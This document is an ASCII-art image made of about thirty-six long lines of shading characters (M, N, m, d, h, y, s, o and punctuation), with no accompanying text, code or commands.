MMMMMMMMMMNNNNmmdhhhhhhdmmNNNNMMMMNNmdhysssoo+++osssooshdddhhhhhdmmmmdhhhddmmmhso+oyyso/::--..---:/+ossssydNNdyosyhhhhhhdddddddddddddddddddddddmmmNNNNmmmdmmmmmmmmmmNNmmmmmmmmmmmho-.......``.`...-:+shs:--......-://:/oydmmhyso//+syy+:--..............``````..............----------.........`````..``````````..-:/oyhddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhhhhssydNmho+oosoo/:-..```/hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMNNNmdhhhhhhhdmmNNNMNNNNdhsooossyhddddyydmmdhyhddmmmmddddmmNNNNNds/:/oyyo+:-.....-:/+ossssydNNmyssyyhdhhhdddddddddddddddddddddddmmmmNNNNmmdddmmmmmmmmmNNNmmmmmmmmmNmy+:-.-...`..-:/syys+//:--..`...-----:oydmmhyysoossss+-.-..............................------------------.....`````````````````....-:/shddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhhhysshmNmyoossso+/:-.`.`.sNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMNNmmddhyyyhhdmmNNNMMNNdhsosyhdmmmmddmmmdddddddhysooshmNNMMMNmhso++sys+:-....-:/++ssyyyhmNmhssyyhhdhddddddddddddddddddddddddddmmmNmmmmmmdddmmmmmmdmmNNmmmddmmmNNmds/-..--...:/oso/--..--:/+:........-:oyddhhhhyshhsoo/-------........................--------------------......`.`.``.``````````...--:ohddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhhyssdNNdysyyso+//:.```.omMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMNNNmmdhhssooshdmNNMNNmhyyhdmmmmmhddmddhhhysooossoosdNMMMMMNmdds/+so+:-...--:/+ossyyydNNdssyyhhhhddddddddddddddddddddddddddddddmmmmmmmdddmmmmmdddmNmmmmddmmmNNNmds:..--.`./oo/-.``..--/+ss+.`.....-:+oossyyyysyyoo+/:------------.................--------------:::::::-.....```.......`........--/+shdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhyssymNNhsssyso+/:.```.+hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMNNNNmdhsooosyhdmNNNmmddmmmmmdhhddhhhyso+/+ooo+//sdNNNMMNmmdy++oo/:-..--:/+oosyyyhmNmhosyyhhhdddddddddddddddddddddddddddmdhdmmmmddddmmmddmddhdmmmmNmddmmmNNNNmh/..---.-:/:-.```.-::::/oo:.``....-::/+oooossso++//:-------------..............-------------:::://+oo/-``....```..........---::/+syhddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhyyssdNNdysyysso+/-..``:smMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdhhyyyyhdmmmmmmmmmmmdhyssssso++++oo+////+oydNNNNNmmy+oso/:-..-://+ossyyydNNdsosyhhhhdddddddddddddddddddddddddddmdhhdmNmmddddmmmddmmddmmmmNmddmmmmmmmNmy/-.---..-..`...--:-----/o+:.....--:://++ooooo+/:::------------------..........-------::::::/+ossso/:-.......-:+ossoo//::/++osyhdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhhyysymNmhyyssso+/:-..`./hNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmdhhyyyhhddmmddddmmhs+++++/:::/+oo+/:/++//oyhdmmmdssys+:---::/+ossyyyhmNmhossyhhhddddddddddddddddddddddddddddmmdhdmmmmdddmmmmddmmdmmmmmmmddmmmmNNNNNmho:----.......---......-+s+-`...----:://+oo++//::--------------.--------------------::///+oosso+:-.........-+hmmmdyysyyyhhdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhhyssdNNdysssso+//:-...-odNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmdhhyyyyhhhhhddhys+/+++////+oo+////oss+/:/+oshhhyyyo:-.-::/ossyyyhdNNmsosyhhhddddddddddddddddddddddddddddmmmmddddmmmddmmmmNNmmdmmdddmmmmmmmNNNNNmmNds/-.-----.............-:-.-...--..--://+++/:::------------.......-------------::://++ossss+:-..........-:/oyysoooosyhhddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhyssymNmhsooso+//:--..-/ymNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmddhyyyyyyyysssssssssssssso////osyyysso++++osssso/--::/+osyyyyhmNNdssyyhhdddddddddddddddddddddddddddddmmmmmddddmmmmmmmNNNNmmdmdddmmmmmmmmmNNNmmmmmds+:-.--.........`..-::::--..-....---:://:::---------------......-----::::////+osyysso/:--..............---/sdmmmNmy+shddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhhyssdNNdsoosso+/::-...:ydNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmddhhyyyssssyyyyhhhhhyso///+oyhyssyhhyssssoo+/--::/+ossyyyydNNmyosyhhddddddddddddddddddddddddddddddddmmmdmmmmmNNNNNNNNmmNmmmddmmmmmmmmmmmNmmmmmmmmds/-..........-:osyysoo+/:.--..-------------------------.......----::/+osyyyhddho:-....................-/ymMMNMNs/ohdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhysoymNmyosssoo+/:-.../ymmmmmmNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhhyyyssssyyhhhhys++++++oyhyssyhhhhhddhyo/--://+osssyyhmNNhssyhhddddddddddddddddddddddddddddddddddddmmmmmmNNNNNNNNmNNmNNmddmmmmmmmmmmNNmmmmmNNNNdyo:-.....`:shddhsooyhhs+:-----------------------------......--::////+ydmmmmNmdy+-...............`...-/hNMMNMdo/+shddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhysosdNNhsssso+//:-.../ydmmdhhdmmmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmdhyyssssyyyyssooosss++syyyyyyhhhhhdhyo/--:/++osyyyyhNNmysyhhddddddddddddddddddddddddddddddddddddddddddmmNNNNNNNmmmmNNNddmmmmmmNNNNNNNNNNNNNNNNNmdyo/-...odNmddysyhmmdy/-----------:-------------------.....--://////oshmmNNNNNhs+:-..........-:/+oshmMMMNms:-:+ydddddddddddddddddddddddddddddmdddddddddddddddddddddddddmmmmmmmmmdddddddddddddddhysshNNdsooo++/::-.../sdmddhyyyyhdmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhhyssyyyssssyhhhs++osyyyyyyyyyyys+/:--:/+osyyysydNNmysyhhddddddddddddddddddddddddddmmmmmmmmdddddddddmmNNNNNNNmmmmNNmmmmmNNNNNNNNNNMNNNNNNNNNNNNmy/-.-sddhyso++ydNmd+..-------:::::-----------------......-://++/////oshmNNNNNNds+/:://++syhdmNNNNMMNNNh/-.-/sdddddddddddddddddddddddddddddmdddddddddddddddddddddddddmmdmmmmmddddddddddddddddhysshmNmo///++/:--..-/shmmddhhyyyyhmmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmdhyyyyyyyyyyhhs+++oyyhyyyysssso+/---:/ossyyysydNNdssyhddddmmmmmmdddddmmmmmmmmmmmmmmmmmmmmmmmddddddmmmNNNNNNmmmmmmNNNNNNNNNNNNNMMMMMNNMMMNMNmNNmho:-oyyo//:-.:smNms-.-----:::::::-----------------.......--:///+++/::/oyddmNNNNNmmmNNNNNNNNNNNmmmmmmdyoo+oyddmdddddddddddddddddddddddddddmdddddddmddddmmddddddddddmmmmmmmddddhdddddddddddddhyysymNms::::/::--..-+shddddhhhhhddmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmdhhyyysysssso++syhhhhyso+++////::::+ssyyssyhmMNhsyhddmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmdddmdddmmmNNNNNNNmmmmNNmNNNNMMMMMMMMMMMMMMMNNNmdmmmmds:/so:---.../shdo--:--::::::::::----------------.........--::/+++++/::/+ydmmmNNNNNNNmmmddhyyyhhhhddhsyyhdddddddddddddddddddddddmmmmmmmmmmmddddmmmmmmmmmmmmmmmmmmmmmmmmdddhhhhddddddmddddddhyssdNNy/:-:::::-.-:osyysooosyydmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmdhyysyyysoo+osyhhhyso+//::::::://+syyyssydNMNhshhdmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmddmmmNNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMNNmmdhdhhdmh+/oo/-.....:+sso/+/:::::::::::::------------------...-....--:///++++/:---::/++++++////::::://///::::::/+ydddmmmmmdddddddddddddmddmmmmdmmmmddmmmmmmmmmmmmmmmmmmmmmmmmddhhyyyhdddmddmddddddhyyshmNd+:::-----.-/syhso/+oyhdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmddhyssyysooossyyyyyo+/:::--::////+syhyyyymNNmyyhdddmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmddmmmmmmNNNNNNNNNNNNNNNNMMMMMMMMMMMNmddhhyssyhhhysys+:...-/+oosyo/::::::::::::::--:-----------------.......--:://++++//:--......................-------+ydddddmmmmmdddddddddmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmdddddhyssshddmmmmdmddddddhhysymNms/:::---..-/shhhyshmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdddhsoooosyyyyssoo++//:----::///++osyyyyymNNdyyhddmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmNNNNNNMMMMMMMNNNMMMMMMMMNNmmdyo+++oosyyyhmmdhsssyhhhhy+::::///::::::::::::----------------.........--:://+++++//::----------------::::///+ossyhddddddmmmmdddmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmddmdhysoosyddmmmmmmmdddddddhysymNmy/:::--...-:+yhdmmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmddhyooyhdhhyso+////:-----:://++oosyyyyhmNNdyyhdmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmNNNNNMMMMMMMMMNNNNMMMMMMNmmNds////+oooooossyyyyhdNNmyo/::://////::/::::::::----------------..........--:////+++/////:::::://+++ooooosyhhdmNmmdddddddmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmdhyo++oyhdmmmmmmmmmmdddddhysydNNh/::::-....-/sdmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmdhso+shdddhso+////:-----:://+osyyyyyshNMNhyyddmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmNNNNNMMMMMMMMMNNNMMMMMNNNNmhs/::///++++/::::/+ymmdho/:::://////////:::::::::::::------------------....--:://///::::------::////////++ooymNhydddddddmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmdhs+//+oydmmmmmmmmmmmmddddhyyydNNh/::::-...../yhhyhmNMMMMNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdhyysshdmmdhso++/::-----:://+osyyyysyhmMNhyhddmmmNmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmNNNMMMMNMMMMNMMMMMMMNNmdhs+///:////+////+oyddhs+/:-::://++++////////::::::::::::::::::-----------.....--://///::-----------------::-/hNs+hdddmdddmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmdho/::/oydmmmmmmmmmmmmmmdddhhysdNNh+////:-..../ossshmNMMMNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhhyhhhyhdddhyo++//:-----::://+osssssyhmMNhyhddmmmNmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmNmmmmNNNMMNNNMMMMMMMMMMMNNmdhs+//:::////+++oossss+/:----:://+++++++///////////:::::::::::::::::---------....--:::///::::---..........----sNh+sdmmmddmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmdyo:-::+shmmmmmmmmmmmmmmmmdddhyydNNdo++++/:-...:+oydmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdysyyhhhhhdddhyysso+/::----::///+oossyyhNMNhyhdmmmNmmmmNmmmNmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmNmmmmmmNNNMMMMMMMMMMMMMNNmdys++/:::::::///////::::-----:://+oooooo++++////////:::::::::::::::::--------.......--::::::::---...........--:yNhshmmddmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmdyo/--:/ohdmmmmmmmmmmmmmmmmdddhyydNNmyooo+//:...-+ydmmmmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdsshhhhhhddmmddddhyo+/:-:--:::///+osyyyhNMNhyhdmmmNNmmNNNmmNmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmNNmmmdhhdmNNMMMMMMMMMMMNNmdhys+/::::-------------------::/+oyyyyyysssoo+++/////::::::::::::::::::::--------......--:::::::----........-.`:dNhoymddmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmdy+:---/oydmmmmmmmmmmmmmmmmmmddhyydNNmhsssoo+:-..:shmmhhdNMMMMMMMMNNMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNhosddhhhhhhddddhyso+//:----::://+ossyyyhNMNhyhdmmmNNNNNNNNmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmNNNNNmdhhhdmNNNNNMMMNMNNNmddyo/:::----------.......-----::/osyhdddddhhyysoo++////::::::::::::::--:::-----------.....--::///::--.........`-yNms+ymmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmdyo:---:+shdmmmmmmmmmmmmmmmmmmddhyshNNmhyysso+/---+syyyshmNMMMMMMNmhydmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNhoohhhhhysoooo+++/////:-----::/++ssssyyhmNNhyhdmmNNNNNNNNNNmmNmmNNNNNNNNNNNNmmmmmmmmmmmmmmmmmmmmmmmmmmNNNNNNNNNNdhhdddmmmmNMMMMNNNNmdy+/::::---------.........-----:/+oshddmmNmmddhyssooo+////::::::::::::-------------------..--://///:--.........+dNdssdmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmhy+:---:/oydmmmmmmmmmmmmmmmmmmmddhyyhNNmyosssoo/::/++//ohmNMMMMMMMNmyo++odmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNy+ohdddyo+//+++oooo+//:-----::/+oosssoosdmmhyhdmmNNNNNNNNNNmNNNNNNNNNNNNNNNNmmmmmmmmmmmmmNmmmmmmmmmmNNNNNNNNNNNNmhhdmmdhdmNNMMNNNNNmdy+/:::-------....:/:-......---:::/+osyhdmmNNNmmddhhhysso+++////:::::::------::::::::::::------:://::--........:sNNhshmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmds+:---:/+shdmmmmmmmmmmmmmmmmmmmddhyydNNmsosssso+/://:-:sdNMMMMMMMMNmyo+///ohNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdysymmmho+//+++oyhhyo+/-----::/++ossooo+oyddyyhdmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmdydmNdddmNNMMMNNNmmdy+/::::------..-/ys/------------::::/++osyddmmNNNNmmmmddhyysssooo++++////::::::::::://////::----::::--......-.-/hNmsodmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmdy+/:::::/oyhmmmmmmmmmmmmmmmmmmmmmdhhydNNmsoossoo/:::/--+hNMMMMMMMMMNdyo+/:/+ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhhdmmdy////+oshdmdhso/--.--::/+osyysoo++syysoyhdmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmNmdhdmmmmmmNNMNNNmmdhhyo+/::::------:+sho/::-----------::::://++osyhhdmmmNNNNNNNmmmmddddhhyyyssooo++++//////////////::-:--------------omNyodmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmddys+/::://+shdmmmmmmmmmmmmmmmmmmmmmddhydNNdooooo+/:::/+/:odNNMMMMMMMMNdyo+//:/sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmddmmhso+osyhdmmNNNmhs+:-.--:/+osyyyyoo++osyoosyhdmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmddddmmmmNMMNNmmdhhyso+//:::-----:oyyy+::----:-----------:::::///+ossyhdmmNNNNMMNNNNNNNNNNmmddddhhhyyysssoo+++++++//::::::----------+mNhohmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmdys+//////+oyddmmmNNNmmmmmmmmmmmmmmmddyydNNh++oo+/::::/o+/oymNMMMMMMMMNmyo+//:/sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmmddhyssyssydmNMMNNNdhs+:---:/+osysso++++osysosyyhdmmmmNmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmdddmmmmNNMNNmmmdhsso+///::----:+yhhho///::::::-:::-----::::::////++oosyhhdmmmNNNNNNNNMMMNMNNNNNNNNmmmmddhhyyyssso+++///////:::-:::/yNdydmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmdhso++/++++oshdmmmmNNmmmmmmmmmmmmmmmmdhyymNNhooo++/:--:/syyhhyhmNMMMMMMNmho+////odNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmddddddhyyyyhddhyyyysosydNMMMMMNmdys+/--:+oooo+++ooooyhysossyyyhhdmmmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmdddmmmNNMNNmdddhyooo++//:::---:ohdddysoo/:::::///:::::::::-::/++/+++++oosyhhhddmmmmmNNNNNNNNMMMNMMMMMNNMNNNNmmdddhhyyssooo+++//////odmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmdhyoo+++++oosyhmmmNNmmmmmmmmmmmmmmmmmmdhyymNNhoo++/:--.-:sdmNmdddNMMMMMMMNhs+////ohmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNddysoo++++++osyhdddddhs++sdmNMMMMMNNmhsoo/::+++///+osssyhddyoosssyyyhhddmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmdhdmmNMMNNmhyyso+++o+///::::::/shdddy+/:::::/++++/::::---:--/oyo///+++oossyyyyyhhhdddmmmmmNNNNNNNNNNNNNNMMMMNNNNNNNNmmdddhhhyyyyyyyydmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmdhsooooooooosydmmmNmmmmNNNNNNNmmmmmmmmdhyhmMNhoooo+/:-..:odmNNNNNNMMMMMMMNds+////+ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhssyhddhhyssyyyyyys++ydmNMMMMMNNmdhso+/:::////+ossssyhmmdyossyyyyyyyhdmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmddmNMNmdhysoo++///+++///:::::/shdddyo/:::/+oooo+/::::::---:oyy+///++oooosssyyyyyhhddmmmmmNNNNNNNNNNNNNNNNNMNNNNNNNNNNNNNNNNNmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmNNmmmmdhysoooooossssydmmNNmNmmmmmmmmmmmmmmmmmdhydNNmhsoooo/:-.-/ohmNNMMMMMMMMMMMNds+//::+ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNdhdmNNmdyyyyyo+++//smNNMMMMMMNmddyo+/:::-:://+osyyyyhmNmhssyyyyyyyyyhdmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmNNMNdyoo++///////+////:::///oyddddyo++++ossoo+/----+o/:/syhs+///+++++oossyyhhhhdmmmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmNNmmmddhyssssssssssyhdmmNNmNNmmmmmmmmmmmmNmmddhydNNdysooo+/:..-/shddmNNMMNNmmNMNNmy+::-:/sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMNNNmdmNNNNddhhhs+/+sooydNNMMMNNNmdhyo+///::-:://osyyyyyhmNNdyyyyyyysssssyhddmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmNNdys++////////////:::://:/shdddhyysooyyyso+:----/syyhhhyo////////++oossyyyhhdmmmmNNNNNNNNNNNNNNNNNNNNNNmmmmmNNmmNNNNmmNmmmmNNNNNNNNNNNNmmmmmmmmmmmmmmmmmmmmmmmmNmmmmmmdhyyssssssyyyyyhdmmNNmNNmNmmmNNNNNNNNmmddhhmNNhsooo+/:--..:shhyoshmNNmddmmNNdyo:---/odmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmmNNNNNmmmNNNNmdhhyssshmdhsyddmmmmddhso+//+++/:-::/+osyhhhhhdNNmhyhhhhyyssssssyyhdmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmmNNmds++///////////::::::::+yddddhhysoosssoo+//+ooyhdddyo//::::://////+++ooosyhdmmNNNNNmmNNNNNNNNNNNNNNmmmmmmmmmmmmmmmmmmmmmNNNNNNNNNNNNmmmmmmNNNNNNNNNNNNNNNNNNNNNmmmdhyyyysyyyyyyyyyhdmmNNNNmmNNNNNNNNNNNmmmdhhhmNNys++++/:-...:sdmdyssyhhhysyyhdhy+:-..-/ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
